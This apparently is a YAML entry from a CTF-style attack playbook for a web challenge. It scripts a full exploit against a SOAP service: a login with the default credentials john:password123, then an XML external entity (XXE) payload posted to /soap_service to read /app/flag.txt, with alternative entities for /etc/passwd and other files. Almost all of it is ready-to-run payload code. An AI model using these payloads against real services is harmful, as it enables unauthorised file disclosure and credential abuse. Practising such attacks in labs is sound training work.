name: xxe_soap_service
category: web
tags: [xxe, xml, soap, default_credentials]
indicators:
  - "SOAP service"
  - "XML parsing"
  - "resolve_entities=True"
  - "Default credentials"

tricks:
  - name: "Step 1: Login with default credentials"
    when: "Found default account"
    how: "Use john:password123 to get session"
    payload: |
      session = requests.Session()
      session.post("http://TARGET/login", data={
          "username": "john",
          "password": "password123"
      })

  - name: "Step 2: Craft XXE payload"
    when: "SOAP service enables entity resolution"
    how: "Construct XXE payload to read /app/flag.txt"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///app/flag.txt">
      ]>
      <GetAccountInfoRequest>
          <account_id>&xxe;</account_id>
      </GetAccountInfoRequest>

  - name: "Step 3: Extract the flag"
    when: "Execute attack"
    how: "Login then send XXE payload to /soap_service"
    payload: |
      session.post(f"{TARGET}/login", data={"username": "john", "password": "password123"})

      xxe = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
      <GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>"""

      resp = session.post(f"{TARGET}/soap_service", data=xxe, headers={"Content-Type": "application/xml"})

  - name: "Alternative: Read other files"
    when: "Read other files"
    how: "Modify SYSTEM path"
    payload: |
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
      <!ENTITY xxe SYSTEM "file:///app/py">
